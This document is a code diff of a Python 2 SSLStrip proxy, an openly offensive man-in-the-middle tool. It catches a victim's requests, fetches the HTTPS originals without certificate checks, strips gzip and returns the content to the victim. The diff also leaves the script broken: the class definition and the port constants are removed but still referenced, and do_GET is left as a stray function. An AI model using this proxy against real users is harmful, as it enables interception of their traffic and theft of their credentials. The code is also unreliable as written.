@@ -153,36 +153,54 @@ from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
 import httplib
 import ssl
 import urlparse
+import gzip
+from StringIO import StringIO
 
-ATTACKER_IP = "0.0.0.0"
-ATTACKER_PORT = 8080
+def do_GET(self):
+    host = self.headers.getheader('Host', '')
+    url = "https://{}{}".format(host, self.path)
+    print "[+] Victim requested:", url
 
-class SSLStripProxy(BaseHTTPRequestHandler):
-    def do_GET(self):
-        host = self.headers.getheader('Host', '')
-        url = "https://{}{}".format(host, self.path)
-        print ("[+] Victim requested:" + url)
+    try:
+        # Create HTTPS connection and send request (using httplib here for Python 2)
+        import httplib, ssl, urlparse
 
-        try:
-            # Parse URL manually
-            parsed = urlparse.urlparse(url)
-            conn = httplib.HTTPSConnection(parsed.hostname, parsed.port or 443, context=ssl._create_unverified_context())
+        parsed = urlparse.urlparse(url)
+        conn = httplib.HTTPSConnection(parsed.hostname, parsed.port or 443,
+                                       context=ssl._create_unverified_context())
+        path = parsed.path or "/"
+        if parsed.query:
+            path += "?" + parsed.query
 
-            # Forward the original path and headers (basic)
-            conn.request("GET", parsed.path + ("?" + parsed.query if parsed.query else ""), headers=self.headers.dict)
+        # Tell server not to gzip so easier to handle
+        headers = {
+            "User-Agent": "Mozilla/5.0",
+            "Accept": "*/*",
+            "Accept-Encoding": "identity",  # Request no compression
+            "Host": host
+        }
 
-            # Get response
-            resp = conn.getresponse()
-            content = resp.read()
+        conn.request("GET", path, headers=headers)
+        resp = conn.getresponse()
+        content = resp.read()
+        content_encoding = resp.getheader('Content-Encoding', '')
 
-            # Send back to victim
-            self.send_response(resp.status)
-            self.send_header("Content-type", resp.getheader('Content-Type', 'text/html'))
-            self.end_headers()
-            self.wfile.write(content)
+        # If gzip, decompress before sending to victim
+        if content_encoding == 'gzip':
+            buf = StringIO(content)
+            f = gzip.GzipFile(fileobj=buf)
+            content = f.read()
 
-        except Exception as e:
-            self.send_error(502, "SSLStrip failed: {}".format(e))
+        # Send response headers and decompressed content
+        self.send_response(resp.status)
+        content_type = resp.getheader('Content-Type', 'text/html')
+        self.send_header("Content-type", content_type)
+        self.send_header("Content-Length", str(len(content)))
+        self.end_headers()
+        self.wfile.write(content)
+
+    except Exception as e:
+        self.send_error(502, "SSLStrip failed: {}".format(e))
 
 if __name__ == "__main__":
     print ("[*] Starting SSLStrip proxy on port" + ATTACKER_PORT)
